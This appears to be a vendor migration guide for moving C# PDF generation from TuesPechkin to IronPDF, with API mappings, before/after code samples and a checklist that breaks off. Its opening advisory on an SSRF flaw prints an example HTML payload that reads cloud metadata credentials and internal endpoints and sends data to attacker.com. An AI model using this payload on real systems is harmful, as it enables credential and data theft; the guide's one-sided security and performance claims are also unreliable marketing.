# How Do I Migrate from TuesPechkin to IronPDF in C#?

## ⚠️ CRITICAL SECURITY ADVISORY

**TuesPechkin wraps wkhtmltopdf, which has CRITICAL UNPATCHED SECURITY VULNERABILITIES.**

### CVE-2022-35583 — Server-Side Request Forgery (SSRF)

| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2022-35583 |
| **Severity** | **CRITICAL (9.8/10)** |
| **Attack Vector** | Network |
| **Status** | **WILL NEVER BE PATCHED** |
| **Affected** | ALL TuesPechkin versions |

**wkhtmltopdf was officially abandoned in December 2022.** The maintainers explicitly stated they will NOT fix security vulnerabilities. This means every application using TuesPechkin is permanently exposed.

### How the Attack Works

```html
<!-- Attacker submits this HTML to your PDF generator -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="http://internal-admin-panel:8080/api/users?export=all" />
<script>
  fetch('http://192.168.1.1/admin/config').then(r => r.text()).then(d => {
    new Image().src = 'https://attacker.com/steal?data=' + btoa(d);
  });
</script>
```

**Impact:**
- Access AWS/Azure/GCP metadata endpoints
- Steal internal API data
- Port scan internal networks
- Exfiltrate sensitive configuration
- Access internal admin panels

### Real-World Attack Scenarios

1. **Invoice Generator**: User-submitted content in invoices accesses internal APIs
2. **Report Builder**: Template injection steals database credentials
3. **Certificate Generator**: Name field contains malicious HTML
4. **Email-to-PDF**: Forwarded emails trigger SSRF attacks

---

## Table of Contents
1. [Why Migrate NOW](#why-migrate-now)
2. [TuesPechkin's Critical Problems](#tuespechkins-critical-problems)
3. [Quick Start Migration (5 Minutes)](#quick-start-migration-5-minutes)
4. [Complete API Reference](#complete-api-reference)
5. [Code Migration Examples](#code-migration-examples)
6. [Thread Safety Comparison](#thread-safety-comparison)
7. [Features Not Available in TuesPechkin](#features-not-available-in-tuespechkin)
8. [Performance Comparison](#performance-comparison)
9. [Deployment Comparison](#deployment-comparison)
10. [Troubleshooting Guide](#troubleshooting-guide)
11. [Migration Checklist](#migration-checklist)
12. [Additional Resources](#additional-resources)

---

## Why Migrate NOW

### The Security Crisis

| Risk | TuesPechkin | IronPDF |
|------|-------------|---------|
| **CVE-2022-35583 (SSRF)** | ❌ VULNERABLE | ✅ Protected |
| **Local File Access** | ❌ VULNERABLE | ✅ Sandboxed |
| **Internal Network Access** | ❌ VULNERABLE | ✅ Restricted |
| **Security Patches** | ❌ NEVER | ✅ Regular updates |
| **Active Development** | ❌ Abandoned 2015 | ✅ Monthly releases |

### The Technology Crisis

TuesPechkin wraps wkhtmltopdf, which was last updated in **2015**. It uses:
- **Qt WebKit 4.8** (ancient, pre-Chrome era)
- **No Flexbox support**
- **No CSS Grid support**
- **Broken JavaScript execution**
- **No ES6+ support**

### The Stability Crisis

```csharp
// ❌ TuesPechkin - Even with ThreadSafeConverter, crashes under load
var converter = new TuesPechkin.ThreadSafeConverter(
    new TuesPechkin.RemotingToolset<PechkinBindings>());

// Crashes with:
// - AccessViolationException
// - StackOverflowException
// - Process hangs indefinitely
// - Memory corruption
```

### Feature Comparison

| Feature | TuesPechkin | IronPDF |
|---------|-------------|---------|
| **Security** | ❌ Critical CVEs | ✅ No known vulnerabilities |
| **HTML to PDF** | ⚠️ Outdated WebKit | ✅ Modern Chromium |
| **CSS3** | ❌ Partial | ✅ Full support |
| **Flexbox/Grid** | ❌ Not supported | ✅ Full support |
| **JavaScript** | ⚠️ Unreliable | ✅ Full ES6+ |
| **Thread Safety** | ⚠️ Complex, crashes | ✅ Native |
| **PDF Manipulation** | ❌ Not available | ✅ Full |
| **Digital Signatures** | ❌ Not available | ✅ Full |
| **PDF/A Compliance** | ❌ Not available | ✅ Full |
| **Form Filling** | ❌ Not available | ✅ Full |
| **Watermarks** | ❌ Not available | ✅ Full |
| **Merge/Split** | ❌ Not available | ✅ Full |
| **Encryption** | ⚠️ Limited | ✅ Full |
| **Headers/Footers** | ⚠️ Basic | ✅ Full HTML |
| **Active Maintenance** | ❌ Abandoned 2015 | ✅ Weekly updates |

---

## TuesPechkin's Critical Problems

### Problem 1: The Security Nightmare

Every application using TuesPechkin is vulnerable to SSRF attacks:

```csharp
// ❌ DANGEROUS - Any user input can trigger SSRF
var document = new TuesPechkin.HtmlToPdfDocument
{
    Objects = {
        new TuesPechkin.ObjectSettings {
            HtmlText = userProvidedHtml  // ATTACKER CONTROLLED!
        }
    }
};

byte[] pdf = converter.Convert(document);
// Attacker's HTML can now access your internal network!
```

### Problem 2: The Thread Safety Lie

TuesPechkin advertises "thread-safe" but it still crashes:

```csharp
// ❌ TuesPechkin - "ThreadSafeConverter" still crashes
var converter = new TuesPechkin.ThreadSafeConverter(
    new TuesPechkin.RemotingToolset<PechkinBindings>());

// Under high load, you'll see:
// System.AccessViolationException: Attempted to read or write protected memory
// Process terminated unexpectedly
// Converter hangs indefinitely
```

### Problem 3: Complex Deployment

```csharp
// ❌ TuesPechkin - Complex initialization ritual
var converter = new TuesPechkin.StandardConverter(
    new TuesPechkin.RemotingToolset<PdfToolset>(
        new TuesPechkin.Win64EmbeddedDeployment(
            new TuesPechkin.TempFolderDeployment())));

// Also requires:
// - Platform-specific wkhtmltopdf binaries
// - Correct architecture (x86/x64)
// - Native library path configuration
// - AppDomain isolation for stability
```

### Problem 4: Outdated Rendering

```html
<!-- This modern CSS doesn't work in TuesPechkin -->
<div style="display: flex; justify-content: space-between; gap: 20px;">
    <div style="flex: 1;">Column 1</div>
    <div style="flex: 1;">Column 2</div>
</div>

<div style="display: grid; grid-template-columns: repeat(3, 1fr);">
    <div>Grid Item 1</div>
    <div>Grid Item 2</div>
    <div>Grid Item 3</div>
</div>
```

---

## Quick Start Migration (5 Minutes)

### Step 1: Update NuGet Packages

```bash
# Remove TuesPechkin and all related packages
dotnet remove package TuesPechkin
dotnet remove package TuesPechkin.Wkhtmltox.Win64
dotnet remove package TuesPechkin.Wkhtmltox.Win32

# Install IronPDF
dotnet add package IronPdf
```

### Step 2: Remove Native Binaries

Delete these files/folders:
- `wkhtmltox.dll`
- `wkhtmltopdf.exe`
- Any `wkhtmlto*` files
- `TuesPechkin.Wkhtmltox` folder

### Step 3: Update Using Statements

```csharp
// Before
using TuesPechkin;
using TuesPechkin.Wkhtmltox.Win64;

// After
using IronPdf;
```

### Step 4: Add License Key

```csharp
// Add at application startup
IronPdf.License.LicenseKey = "YOUR-LICENSE-KEY";
```

### Step 5: Update Code

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperSize = PaperKind.A4,
        Orientation = GlobalSettings.PdfOrientation.Portrait
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<h1>Hello World</h1>"
        }
    }
};

byte[] pdf = converter.Convert(document);
File.WriteAllBytes("output.pdf", pdf);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;
renderer.RenderingOptions.PaperOrientation = PdfPaperOrientation.Portrait;

var pdf = renderer.RenderHtmlAsPdf("<h1>Hello World</h1>");
pdf.SaveAs("output.pdf");
// No thread safety issues! No security vulnerabilities! No native binaries!
```

---

## Complete API Reference

### Namespace Mapping

| TuesPechkin Namespace | IronPDF Namespace |
|----------------------|-------------------|
| `TuesPechkin` | `IronPdf` |
| `TuesPechkin.Wkhtmltox.Win64` | Not needed |
| `TuesPechkin.Wkhtmltox.Win32` | Not needed |

### Core Class Mapping

| TuesPechkin | IronPDF | Notes |
|-------------|---------|-------|
| `ThreadSafeConverter` | `ChromePdfRenderer` | Thread-safe by default |
| `StandardConverter` | `ChromePdfRenderer` | No converter variants |
| `RemotingToolset<T>` | Not needed | Internalized |
| `Win64EmbeddedDeployment` | Not needed | No native binaries |
| `TempFolderDeployment` | Not needed | No deployment |
| `HtmlToPdfDocument` | Direct method calls | Simpler API |
| `GlobalSettings` | `RenderingOptions` | On renderer |
| `ObjectSettings` | `RenderingOptions` | On renderer |

### GlobalSettings Mapping

| TuesPechkin GlobalSettings | IronPDF Equivalent |
|---------------------------|-------------------|
| `PaperSize = PaperKind.A4` | `PaperSize = PdfPaperSize.A4` |
| `PaperSize = PaperKind.Letter` | `PaperSize = PdfPaperSize.Letter` |
| `Orientation = .Portrait` | `PaperOrientation = PdfPaperOrientation.Portrait` |
| `Orientation = .Landscape` | `PaperOrientation = PdfPaperOrientation.Landscape` |
| `OutputFormat = .Pdf` | Default (always PDF) |
| `Margins.Top = 10` | `MarginTop = 10` |
| `Margins.Bottom = 10` | `MarginBottom = 10` |
| `Margins.Left = 10` | `MarginLeft = 10` |
| `Margins.Right = 10` | `MarginRight = 10` |
| `DocumentTitle = "..."` | `pdf.MetaData.Title = "..."` |
| `Dpi = 300` | `PrintDpi = 300` |

### ObjectSettings Mapping

| TuesPechkin ObjectSettings | IronPDF Equivalent |
|---------------------------|-------------------|
| `HtmlText = "..."` | `RenderHtmlAsPdf("...")` |
| `PageUrl = "https://..."` | `RenderUrlAsPdf("https://...")` |
| `WebSettings.EnableJavascript = true` | `EnableJavaScript = true` |
| `WebSettings.LoadImages = true` | Default (always true) |
| `WebSettings.UserStyleSheet` | CSS in HTML or `CustomCssUrl` |
| `HeaderSettings.Right = "[page]"` | `{page}` in HtmlHeader |
| `HeaderSettings.Left = "[topage]"` | `{total-pages}` in HtmlHeader |
| `FooterSettings.*` | Same pattern with HtmlFooter |

### Placeholder Syntax Mapping

| TuesPechkin | IronPDF | Description |
|-------------|---------|-------------|
| `[page]` | `{page}` | Current page |
| `[topage]` | `{total-pages}` | Total pages |
| `[date]` | `{date}` | Current date |
| `[time]` | `{time}` | Current time |
| `[title]` | `{html-title}` | Document title |
| `[url]` | `{url}` | Document URL |

---

## Code Migration Examples

### Example 1: Basic HTML to PDF

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperSize = PaperKind.A4
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<h1>Hello World</h1><p>Content here</p>"
        }
    }
};

byte[] pdf = converter.Convert(document);
File.WriteAllBytes("output.pdf", pdf);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;

var pdf = renderer.RenderHtmlAsPdf("<h1>Hello World</h1><p>Content here</p>");
pdf.SaveAs("output.pdf");
```

### Example 2: URL to PDF

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperSize = PaperKind.A4,
        Orientation = GlobalSettings.PdfOrientation.Landscape
    },
    Objects = {
        new ObjectSettings {
            PageUrl = "https://example.com",
            WebSettings = { EnableJavascript = true }
        }
    }
};

byte[] pdf = converter.Convert(document);
File.WriteAllBytes("webpage.pdf", pdf);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;
renderer.RenderingOptions.PaperOrientation = PdfPaperOrientation.Landscape;
renderer.RenderingOptions.EnableJavaScript = true;

var pdf = renderer.RenderUrlAsPdf("https://example.com");
pdf.SaveAs("webpage.pdf");
```

### Example 3: Custom Margins

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperSize = PaperKind.A4,
        Margins = new MarginSettings {
            Unit = Unit.Millimeters,
            Top = 20,
            Bottom = 20,
            Left = 15,
            Right = 15
        }
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<h1>Document with Margins</h1>"
        }
    }
};

byte[] pdf = converter.Convert(document);
File.WriteAllBytes("margins.pdf", pdf);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;
renderer.RenderingOptions.MarginTop = 20;    // Millimeters
renderer.RenderingOptions.MarginBottom = 20;
renderer.RenderingOptions.MarginLeft = 15;
renderer.RenderingOptions.MarginRight = 15;

var pdf = renderer.RenderHtmlAsPdf("<h1>Document with Margins</h1>");
pdf.SaveAs("margins.pdf");
```

### Example 4: Headers and Footers

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperSize = PaperKind.A4,
        Margins = new MarginSettings { Top = 25, Bottom = 25 }
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<h1>Document Content</h1>",
            HeaderSettings = {
                FontName = "Arial",
                FontSize = 9,
                Center = "My Document Title",
                Right = "Page [page] of [topage]",
                Line = true
            },
            FooterSettings = {
                FontName = "Arial",
                FontSize = 9,
                Center = "Confidential",
                Line = true
            }
        }
    }
};

byte[] pdf = converter.Convert(document);
File.WriteAllBytes("headers.pdf", pdf);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;
renderer.RenderingOptions.MarginTop = 25;
renderer.RenderingOptions.MarginBottom = 25;

renderer.RenderingOptions.HtmlHeader = new HtmlHeaderFooter()
{
    HtmlFragment = @"
        <div style='width:100%; font-family:Arial; font-size:9px;
                    border-bottom:1px solid black; padding-bottom:5px;'>
            <span style='text-align:center; display:block;'>My Document Title</span>
            <span style='float:right;'>Page {page} of {total-pages}</span>
        </div>"
};

renderer.RenderingOptions.HtmlFooter = new HtmlHeaderFooter()
{
    HtmlFragment = @"
        <div style='width:100%; font-family:Arial; font-size:9px;
                    border-top:1px solid black; padding-top:5px; text-align:center;'>
            Confidential
        </div>"
};

var pdf = renderer.RenderHtmlAsPdf("<h1>Document Content</h1>");
pdf.SaveAs("headers.pdf");
```

### Example 5: JavaScript Execution

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

// ❌ JavaScript execution is unreliable in TuesPechkin
var document = new HtmlToPdfDocument
{
    Objects = {
        new ObjectSettings {
            HtmlText = @"
                <div id='content'></div>
                <script>
                    document.getElementById('content').innerText = 'Dynamic content';
                </script>",
            WebSettings = { EnableJavascript = true }
        }
    }
};

byte[] pdf = converter.Convert(document);
// JavaScript often doesn't execute or executes incompletely
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.EnableJavaScript = true;
renderer.RenderingOptions.WaitFor.JavaScript(2000); // Wait for JS completion

var html = @"
    <div id='content'></div>
    <script>
        document.getElementById('content').innerText = 'Dynamic content';
    </script>";

var pdf = renderer.RenderHtmlAsPdf(html);
pdf.SaveAs("js-content.pdf");
// JavaScript executes reliably with Chromium!
```

### Example 6: Landscape Orientation

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        Orientation = GlobalSettings.PdfOrientation.Landscape,
        PaperSize = PaperKind.A4
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<table style='width:100%'><tr><td>Wide content</td></tr></table>"
        }
    }
};

byte[] pdf = converter.Convert(document);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperOrientation = PdfPaperOrientation.Landscape;
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;

var pdf = renderer.RenderHtmlAsPdf(
    "<table style='width:100%'><tr><td>Wide content</td></tr></table>");
pdf.SaveAs("landscape.pdf");
```

### Example 7: Custom Paper Size

**Before (TuesPechkin):**
```csharp
using TuesPechkin;

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperWidth = "6in",
        PaperHeight = "4in"
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<h1>Custom Size</h1>"
        }
    }
};

byte[] pdf = converter.Convert(document);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.SetCustomPaperSizeInInches(6, 4);

var pdf = renderer.RenderHtmlAsPdf("<h1>Custom Size</h1>");
pdf.SaveAs("custom-size.pdf");
```

### Example 8: HTML File to PDF

**Before (TuesPechkin):**
```csharp
using TuesPechkin;
using System.IO;

string htmlContent = File.ReadAllText("template.html");

var document = new HtmlToPdfDocument
{
    Objects = {
        new ObjectSettings {
            HtmlText = htmlContent
        }
    }
};

byte[] pdf = converter.Convert(document);
```

**After (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();

// Direct file rendering with proper base URL handling
var pdf = renderer.RenderHtmlFileAsPdf("template.html");
pdf.SaveAs("output.pdf");
```

---

## Thread Safety Comparison

### TuesPechkin Thread Problems

```csharp
// ❌ TuesPechkin - Even ThreadSafeConverter crashes

// Attempt 1: Basic usage (crashes)
var converter = new StandardConverter(new PdfTools());
Parallel.For(0, 10, i =>
{
    var doc = new HtmlToPdfDocument { /* ... */ };
    converter.Convert(doc); // CRASH: AccessViolationException
});

// Attempt 2: ThreadSafeConverter (still crashes under load)
var safeConverter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

Parallel.For(0, 100, i =>
{
    var doc = new HtmlToPdfDocument { /* ... */ };
    safeConverter.Convert(doc); // CRASH: Eventually fails
});

// Attempt 3: Static singleton (hangs indefinitely)
private static readonly ThreadSafeConverter _converter = ...;
// Under high concurrency, operations hang and never complete
```

### IronPDF: True Thread Safety

```csharp
// ✅ IronPDF - Works perfectly with parallel processing

// Option 1: Create renderers per operation
Parallel.For(0, 100, i =>
{
    var renderer = new ChromePdfRenderer();
    var pdf = renderer.RenderHtmlAsPdf($"<h1>Document {i}</h1>");
    pdf.SaveAs($"doc-{i}.pdf");
});

// Option 2: Async pattern
var tasks = Enumerable.Range(0, 100).Select(async i =>
{
    var renderer = new ChromePdfRenderer();
    return await renderer.RenderHtmlAsPdfAsync($"<h1>Document {i}</h1>");
});
var pdfs = await Task.WhenAll(tasks);

// Option 3: Reuse single renderer (still thread-safe)
var renderer = new ChromePdfRenderer();
Parallel.For(0, 100, i =>
{
    var pdf = renderer.RenderHtmlAsPdf($"<h1>Document {i}</h1>");
    pdf.SaveAs($"doc-{i}.pdf");
});
```

---

## Features Not Available in TuesPechkin

### PDF Manipulation

```csharp
// ❌ TuesPechkin cannot do ANY of this

// ✅ IronPDF - Merge PDFs
var pdf1 = PdfDocument.FromFile("doc1.pdf");
var pdf2 = PdfDocument.FromFile("doc2.pdf");
var merged = PdfDocument.Merge(pdf1, pdf2);
merged.SaveAs("merged.pdf");

// ✅ IronPDF - Split PDFs
var pdf = PdfDocument.FromFile("document.pdf");
var pages1to5 = pdf.CopyPages(0, 4);
var pages6to10 = pdf.CopyPages(5, 9);
pages1to5.SaveAs("first-half.pdf");
pages6to10.SaveAs("second-half.pdf");

// ✅ IronPDF - Insert pages
var mainDoc = PdfDocument.FromFile("main.pdf");
var cover = PdfDocument.FromFile("cover.pdf");
mainDoc.InsertPdf(cover, 0);
mainDoc.SaveAs("with-cover.pdf");

// ✅ IronPDF - Remove pages
var pdf = PdfDocument.FromFile("document.pdf");
pdf.RemovePage(0); // Remove first page
pdf.SaveAs("without-first-page.pdf");
```

### Digital Signatures

```csharp
// ❌ TuesPechkin cannot sign PDFs

// ✅ IronPDF - Sign PDFs with certificate
var pdf = PdfDocument.FromFile("contract.pdf");
var signature = new PdfSignature("certificate.pfx", "password")
{
    SigningContact = "legal@company.com",
    SigningLocation = "New York",
    SigningReason = "Contract Approval"
};
pdf.Sign(signature);
pdf.SaveAs("signed-contract.pdf");
```

### PDF Security & Encryption

```csharp
// ❌ TuesPechkin has very limited security options

// ✅ IronPDF - Full security control
var pdf = renderer.RenderHtmlAsPdf("<h1>Confidential</h1>");

// Set passwords
pdf.SecuritySettings.OwnerPassword = "owner-secret";
pdf.SecuritySettings.UserPassword = "user-secret";

// Control permissions
pdf.SecuritySettings.AllowUserCopyPasteContent = false;
pdf.SecuritySettings.AllowUserAnnotations = false;
pdf.SecuritySettings.AllowUserPrinting = PdfPrintSecurity.NoPrint;
pdf.SecuritySettings.AllowUserFormData = false;
pdf.SecuritySettings.AllowUserEdits = PdfEditSecurity.NoEdit;

// Set encryption
pdf.SecuritySettings.OwnerPassword = "owner123";

pdf.SaveAs("secured.pdf");
```

### Watermarks & Stamping

```csharp
// ❌ TuesPechkin cannot add watermarks

// ✅ IronPDF - Add watermarks
var pdf = PdfDocument.FromFile("document.pdf");

// Text watermark
pdf.ApplyStamp(new TextStamper()
{
    Text = "CONFIDENTIAL",
    FontFamily = "Arial",
    FontSize = 48,
    Opacity = 30,
    Rotation = -45,
    HorizontalAlignment = HorizontalAlignment.Center,
    VerticalAlignment = VerticalAlignment.Middle
});

// Image watermark
pdf.ApplyStamp(new ImageStamper("logo.png")
{
    Opacity = 20,
    HorizontalAlignment = HorizontalAlignment.Right,
    VerticalAlignment = VerticalAlignment.Top
});

pdf.SaveAs("watermarked.pdf");
```

### PDF/A Compliance

```csharp
// ❌ TuesPechkin cannot create PDF/A documents

// ✅ IronPDF - PDF/A for archival
var renderer = new ChromePdfRenderer();
var pdf = renderer.RenderHtmlAsPdf("<h1>Archive Document</h1>");

// Convert to PDF/A-3b for long-term archival
pdf.SaveAsPdfA("archive.pdf", PdfAVersions.PdfA3b);
```

### Form Filling

```csharp
// ❌ TuesPechkin cannot fill PDF forms

// ✅ IronPDF - Fill PDF forms
var pdf = PdfDocument.FromFile("form.pdf");

pdf.Form.GetFieldByName("FirstName").Value = "John";
pdf.Form.GetFieldByName("LastName").Value = "Doe";
pdf.Form.GetFieldByName("Email").Value = "john@example.com";

pdf.SaveAs("filled-form.pdf");
```

### Text Extraction

```csharp
// ❌ TuesPechkin cannot extract text from PDFs

// ✅ IronPDF - Extract all text
var pdf = PdfDocument.FromFile("document.pdf");
string allText = pdf.ExtractAllText();
Console.WriteLine(allText);

// Extract text from specific page
string page1Text = pdf.Pages[0].Text;
```

### Image Extraction

```csharp
// ❌ TuesPechkin cannot extract images from PDFs

// ✅ IronPDF - Extract all images
var pdf = PdfDocument.FromFile("document.pdf");
var images = pdf.ExtractAllImages();

for (int i = 0; i < images.Count; i++)
{
    images[i].SaveAs($"image-{i}.png");
}
```

### Modern CSS Support

```csharp
// ❌ TuesPechkin - These CSS features DON'T WORK
var brokenHtml = @"
    <div style='display: flex; justify-content: space-between;'>
        <div>Left</div>
        <div>Right</div>
    </div>
    <div style='display: grid; grid-template-columns: 1fr 1fr 1fr;'>
        <div>Col 1</div>
        <div>Col 2</div>
        <div>Col 3</div>
    </div>
";

// ✅ IronPDF - Full CSS3 support
var renderer = new ChromePdfRenderer();
var pdf = renderer.RenderHtmlAsPdf(@"
    <div style='display: flex; justify-content: space-between; gap: 20px;'>
        <div style='flex: 1;'>Left</div>
        <div style='flex: 1;'>Right</div>
    </div>
    <div style='display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;'>
        <div>Col 1</div>
        <div>Col 2</div>
        <div>Col 3</div>
    </div>
");
// Renders perfectly with Chromium!
```

---

## Performance Comparison

| Scenario | TuesPechkin | IronPDF | Notes |
|----------|-------------|---------|-------|
| Simple HTML | 300-600ms | 100-200ms | IronPDF 2-3x faster |
| Complex CSS | Fails/slow | 200-400ms | TuesPechkin can't render |
| JavaScript | Unreliable | 300-500ms | IronPDF works |
| Batch (10) | Sequential | Parallel | IronPDF 5x+ faster |
| Batch (100) | Crashes | Parallel | IronPDF stable |
| Large pages | Memory issues | Stable | IronPDF handles |
| First render | 2-5s (binary load) | 1-2s | IronPDF faster cold start |

---

## Deployment Comparison

### TuesPechkin Deployment (Complex)

```
project/
├── MyApp.dll
├── wkhtmltox.dll           # 50MB+ native binary
├── wkhtmltopdf.exe         # Sometimes needed
├── libwkhtmltox.so         # Linux version
├── libwkhtmltox.dylib      # macOS version
└── x86/x64 variants...     # Multiple architectures
```

Problems:
- Platform-specific binaries required
- Architecture-specific (x86 vs x64)
- Manual binary management
- Native library path configuration
- Docker complexity

### IronPDF Deployment (Simple)

```
project/
├── MyApp.dll
└── (IronPdf manages Chromium internally)
```

Benefits:
- Single NuGet package
- Cross-platform automatically
- No manual binary management
- Works in Docker out of box
- Self-contained

### Docker Comparison

**TuesPechkin Docker (Complex):**
```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:8.0

# Complex wkhtmltopdf installation with security vulnerabilities
RUN apt-get update && apt-get install -y \
    wget fontconfig libfreetype6 libjpeg62-turbo \
    libpng16-16 libx11-6 libxcb1 libxext6 libxrender1 \
    xfonts-75dpi xfonts-base \
    && wget https://github.com/wkhtmltopdf/packaging/releases/download/0.12.6-1/wkhtmltox_0.12.6-1.buster_amd64.deb \
    && dpkg -i wkhtmltox_0.12.6-1.buster_amd64.deb || apt-get install -f -y

# WARNING: CVE-2022-35583 is now in your container!
```

**IronPDF Docker (Simple):**
```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:8.0

RUN apt-get update && apt-get install -y \
    libgdiplus libc6-dev libx11-dev libnss3 \
    libatk-bridge2.0-0 libdrm2 libxkbcommon0 \
    libxcomposite1 libxdamage1 libxfixes3 \
    libxrandr2 libgbm1 libasound2 \
    && rm -rf /var/lib/apt/lists/*

# Secure, modern, no vulnerable binaries
```

---

## Troubleshooting Guide

### Issue 1: "DllNotFoundException" After Migration

**Error (TuesPechkin):**
```
DllNotFoundException: Unable to load DLL 'wkhtmltox'
```

**Solution:** IronPDF has no native binaries:
```csharp
// Just works - no DLLs needed
var renderer = new ChromePdfRenderer();
var pdf = renderer.RenderHtmlAsPdf("<h1>Hello</h1>");
```

### Issue 2: Code Expects byte[] Return Type

**Problem:** TuesPechkin returns `byte[]`, IronPDF returns `PdfDocument`

**Solution:**
```csharp
// Get bytes when needed
var pdf = renderer.RenderHtmlAsPdf(html);
byte[] pdfBytes = pdf.BinaryData;

// Or save directly
pdf.SaveAs("output.pdf");
```

### Issue 3: Header/Footer Placeholders Don't Work

**Problem:** TuesPechkin uses `[page]`, IronPDF uses `{page}`

**Solution:**
```csharp
// Update placeholder syntax
renderer.RenderingOptions.HtmlFooter = new HtmlHeaderFooter()
{
    HtmlFragment = "Page {page} of {total-pages}"  // Not [page] of [topage]
};
```

### Issue 4: CSS Layout Broken

**Problem:** Flexbox/Grid layouts from TuesPechkin workarounds

**Solution:** Use proper CSS with IronPDF:
```csharp
// Remove table-based workarounds, use modern CSS
var html = @"
    <div style='display: flex; justify-content: space-between;'>
        <div>Left</div>
        <div>Right</div>
    </div>";

var pdf = renderer.RenderHtmlAsPdf(html);
// Works correctly with Chromium!
```

### Issue 5: Complex Initialization Code

**Problem:** TuesPechkin requires complex setup

**Solution:** IronPDF is simple:
```csharp
// Before (TuesPechkin)
var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

// After (IronPDF)
var renderer = new ChromePdfRenderer();
// That's it!
```

---

## Migration Checklist

### Pre-Migration

- [ ] **Audit all TuesPechkin usages in codebase**
  ```bash
  grep -r "using TuesPechkin" --include="*.cs" .
  grep -r "ThreadSafeConverter\|RemotingToolset" --include="*.cs" .
  ```
  **Why:** Identify all usages to ensure complete migration coverage.

- [ ] **Document current GlobalSettings configurations**
  ```csharp
  // Find patterns like:
  var globalSettings = new GlobalSettings {
      PaperSize = PaperKind.A4,
      Orientation = Orientation.Landscape
  };
  ```
  **Why:** These settings map to IronPDF's RenderingOptions. Document them now to ensure consistent output after migration.

- [ ] **Document current ObjectSettings configurations**
  ```csharp
  // Find patterns like:
  var objectSettings = new ObjectSettings {
      HtmlContent = "<html>...</html>",
      WebSettings = { EnableJavascript = true }
  };
  ```
  **Why:** These settings will be converted to method parameters in IronPDF.

- [ ] **Identify header/footer implementations**
  ```csharp
  // Look for:
  objectSettings.HeaderSettings = new HeaderSettings { Content = "Header text" };
  objectSettings.FooterSettings = new FooterSettings { Content = "Footer text" };
  ```
  **Why:** IronPDF uses HTML for headers/footers with placeholders, requiring conversion.

- [ ] **Locate all wkhtmltopdf binaries**
  ```bash
  find / -name "wkhtmltopdf*"
  ```
  **Why:** Ensure all binaries are removed to prevent conflicts and security issues.

- [ ] **Assess current security vulnerability exposure**
  **Why:** Identify potential security risks associated with TuesPechkin and wkhtmltopdf.

- [ ] **Obtain IronPDF license key**
  **Why:** IronPDF requires a license key for production use. Free trial available at https://ironpdf.com/

- [ ] **Set up test environment**
  **Why:** Ensure a safe environment to validate migration changes without affecting production.

### During Migration

- [ ] **Remove TuesPechkin NuGet packages**
  ```bash
  dotnet remove package TuesPechkin
  ```
  **Why:** Clean removal of the old package to prevent conflicts.

- [ ] **Remove native wkhtmltopdf binaries**
  ```bash
  rm /path/to/wkhtmltopdf
  ```
  **Why:** Remove outdated binaries to eliminate security vulnerabilities.

- [ ] **Install IronPdf NuGet package**
  ```bash
  dotnet add package IronPdf
  ```
  **Why:** Add the new package to enable IronPDF functionality.

- [ ] **Update using statements**
  ```csharp
  // Before (TuesPechkin)
  using TuesPechkin;

  // After (IronPDF)
  using IronPdf;
  ```
  **Why:** Ensure the code references the correct library.

- [ ] **Add license key initialization**
  ```csharp
  // Add at application startup
